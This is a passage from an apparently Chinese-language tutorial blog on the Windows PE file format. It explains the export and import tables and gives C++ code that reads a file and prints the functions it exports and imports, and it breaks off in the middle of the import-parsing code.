class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">L&quot;C:\\Users\\SouLinker\\Desktop\\dll.dll&quot;</span></span></span><br><span class="line"><span class="comment">// 判断是不是PE文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage, DWORD dwRva)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="type">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeExportsTabel</span><span class="params">(<span class="type">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="type">char</span>* buf = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsPE_File</span>(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这是一个PE文件&quot;);</span></span><br><span class="line"><span class="built_in">AnalyzeExportsTabel</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这不是一个PE文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[]buf;</span><br><span class="line">buf = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage, DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeExportsTabel</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取到导出表的结构</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"><span class="comment">//1 获取到导出表的数据目录结构</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pExportDir =  &amp;pNt-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//1 导出表的数据目录结构中，有导出表的RVA，咱们需要将其转换为FOA，才能在文件中使用</span></span><br><span class="line">DWORD dwExportFOA = <span class="built_in">RvaToFoa</span>(lpImage, pExportDir-&gt;VirtualAddress);</span><br><span class="line"><span class="comment">//1 已经得到了FOA，直接就能够找到导出表的结构</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(lpImage + dwExportFOA);</span><br><span class="line"><span class="comment">//typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span></span><br><span class="line"><span class="comment">//DWORD   Characteristics;</span></span><br><span class="line"><span class="comment">//DWORD   TimeDateStamp;</span></span><br><span class="line"><span class="comment">//WORD    MajorVersion;</span></span><br><span class="line"><span class="comment">//WORD    MinorVersion;</span></span><br><span class="line"><span class="comment">//DWORD   Name;</span></span><br><span class="line"><span class="comment">//DWORD   Base;</span></span><br><span class="line"><span class="comment">//DWORD   NumberOfFunctions;</span></span><br><span class="line"><span class="comment">//DWORD   NumberOfNames;</span></span><br><span class="line"><span class="comment">//DWORD   AddressOfFunctions;     // RVA from base of image</span></span><br><span class="line"><span class="comment">//DWORD   AddressOfNames;         // RVA from base of image</span></span><br><span class="line"><span class="comment">//DWORD   AddressOfNameOrdinals;  // RVA from base of image</span></span><br><span class="line"><span class="comment">//&#125; IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;</span></span><br><span class="line">DWORD dwBase = pExport-&gt;Base;</span><br><span class="line"><span class="comment">//2 得到地址表，名称表，序号表的 FOA</span></span><br><span class="line">DWORD EatFoa = <span class="built_in">RvaToFoa</span>(lpImage,pExport-&gt;AddressOfFunctions);</span><br><span class="line">DWORD EntFoa = <span class="built_in">RvaToFoa</span>(lpImage, pExport-&gt;AddressOfNames);</span><br><span class="line">DWORD EotFoa = <span class="built_in">RvaToFoa</span>(lpImage, pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="comment">//3 得到地址表，名称表，序号表在文件中的位置</span></span><br><span class="line">PDWORD  pEat= (PDWORD)(lpImage + EatFoa);</span><br><span class="line">PDWORD  pEnt = (PDWORD)(lpImage + EntFoa);</span><br><span class="line">PWORD pEot = (PWORD)(lpImage + EotFoa);</span><br><span class="line"><span class="comment">//4 开始解析</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pExport-&gt;NumberOfFunctions; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//4.1 无效地址</span></span><br><span class="line"><span class="keyword">if</span> (pEat[i] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.2 有效地址将下标放到序号表中去寻找</span></span><br><span class="line"><span class="type">int</span>  j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> nSign = FALSE;</span><br><span class="line"><span class="keyword">for</span> (; j &lt; pExport-&gt;NumberOfNames; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == pEot[j])</span><br><span class="line">&#123;</span><br><span class="line">nSign = TRUE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.2.1 找到了，就是有名字的函数</span></span><br><span class="line"><span class="keyword">if</span> (nSign== TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//名称表中，存储的是RVA，需要转为FOA</span></span><br><span class="line">DWORD dwFunNameFOA =  <span class="built_in">RvaToFoa</span>(lpImage, pEnt[j]);</span><br><span class="line"><span class="type">char</span>* pFunName = lpImage + dwFunNameFOA;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;序号:%4x 地址:%x 名称:%s\n&quot;</span>, i+ dwBase, pEat[i], pFunName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.2.2 没有找到，就是没有名字的函数，虚序号</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;序号:%4x 地址:%x 名称:NULL\n&quot;</span>, i + dwBase, pEat[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><h4 id="什么是导入"><a href="#什么是导入" class="headerlink" title="什么是导入"></a>什么是导入</h4><p>当一个可执行文件使用到了其他模块中的函数的时候，就是导入行为。在PE文件中，有一个位置记录了此可执行文件 使用的所有其他模块的函数信息。这个位置就是导入表。</p><p>导入表的作用是什么?</p><p>在加载之前，导入表里面记录本模块所使用的哪些DLL中的哪些函数的名称信息。</p><p>在加载之后，导入表能够记录所使用的函数的地址。供程序运行期间，找到所使用的函数。</p><p>导入表结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C++</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD Characteristics; </span><br><span class="line">        DWORD OriginalFirstThunk;<span class="comment">//(1) 指向导入名称表(INT)的RAV*</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">// (2) 时间标识</span></span><br><span class="line">    DWORD   ForwarderChain;<span class="comment">// (3) 转发链，如果不转发则此值为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">// (4) 指向导入映像文件的名字*</span></span><br><span class="line">    DWORD   FirstThunk;<span class="comment">// (5) 指向导入地址表（IAT）的RAV*</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>OriginalFirstThunk与FirstThunk得到位置，也是一个结构体数组，定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_THUNK_DATA32</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PBYTE  ForwarderString;                                          <span class="comment">// (1) 转发字符串的RAV</span></span><br><span class="line">        PDWORD Function;                <span class="comment">// (2) 被导入函数的地址</span></span><br><span class="line">        DWORD Ordinal;                <span class="comment">// (3) 被导入函数的序号</span></span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;    <span class="comment">// (4) 指向输入名称表</span></span><br><span class="line">&#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><ol><li>当此结构体最高位为0的时候，且此时存储的是导入名称信息，PIMAGE_IMPORT_BY_NAME起作用</li><li>当此结构体最高位为1的时候，且此时存储的是导入名称信息， DWORD Ordinal起作用</li><li>当此结构体存储的是导入地址信息的时候，PDWORD Function起作用</li></ol><h4 id="手工解析"><a href="#手工解析" class="headerlink" title="手工解析"></a>手工解析</h4><p>数据目录表的第1项，就是导入表信息：</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/11.png" alt="image-11"></p><p>RVA：19CE90 ———》 转为FOA： B890</p><p>SIZE：0168</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/12.png" alt="image-12"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD Characteristics; </span><br><span class="line">        DWORD OriginalFirstThunk;<span class="comment">//(1) 指向导入名称表(INT)的RAV*</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">// (2) 时间标识</span></span><br><span class="line">    DWORD   ForwarderChain;<span class="comment">// (3) 转发链，如果不转发则此值为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">// (4) 指向导入映像文件的名字*</span></span><br><span class="line">    DWORD   FirstThunk;<span class="comment">// (5) 指向导入地址表（IAT）的RAV*</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>Name: 0019E460 —–&gt; 19CE60</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/13.png" alt="image-13"></p><p>OriginalFirstThunk: 0019D1CC —–&gt;19BBCC (INT)</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/14.png" alt="image-14"></p><p>irstThunk: 001504D4 —–&gt; 14EED4（IAT）</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/15.png" alt="image-15"></p><p>加载之后，INT中的内容还是原来的内容</p><p>在OD中，加载之后，IAT里面，存储的已经是各个API的地址了。</p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_解析导入表.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">L&quot;C:\\Users\\hugan\\Desktop\\FileCleaner2.0.exe&quot;</span></span></span><br><span class="line"><span class="comment">// 判断是不是PE文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage, DWORD dwRva)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="type">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeImportTabel</span><span class="params">(<span class="type">char</span>* lpImage, <span class="type">bool</span> bAnalyzeInt)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="type">char</span>* buf = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsPE_File</span>(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这是一个PE文件&quot;);</span></span><br><span class="line"><span class="built_in">AnalyzeImportTabel</span>(buf,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这不是一个PE文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[]buf;</span><br><span class="line">buf = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage, DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeImportTabel</span><span class="params">(<span class="type">char</span>* lpImage,<span class="type">bool</span> bAnalyzeInt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取到导入表的结构</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"><span class="comment">//1 获取到导入表的数据目录结构</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY dwImportDir = &amp;pNt-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//1 导入表的数据目录结构中，有导出表的RVA，咱们需要将其转换为FOA，才能在文件中使用</span></span><br><span class="line">DWORD dwImportFOA = <span class="built_in">RvaToFoa</span>(lpImage, dwImportDir-&gt;VirtualAddress);</span><br><span class="line"><span class="comment">//1 已经得到了FOA，直接就能够找到导出表的结构</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(lpImage + dwImportFOA);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2 开始解析</span></span><br><span class="line"><span class="keyword">while</span> (pImportTable-&gt;Name!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2.1 先解析DLL的名字</span></span><br><span class="line"> DWORD dwNameFoa =  <span class="built_in">RvaToFoa</span>(lpImage,pImportTable-&gt;Name);</span><br><span class="line"> <span class="type">char</span>* pDllName = (<span class="type">char</span>*)(dwNameFoa + lpImage);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;DllName:%s\n&quot;</span>, pDllName);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//2.2 解析函数名字，选择用什么去解析</span></span><br><span class="line"> PIMAGE_THUNK_DATA32 pNameTable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (bAnalyzeInt == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD Foa  = <span class="built_in">RvaToFoa</span>(lpImage, pImportTable-&gt;OriginalFirstThunk);</span><br><span class="line">pNameTable = (PIMAGE_THUNK_DATA32)(lpImage + Foa);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD Foa = <span 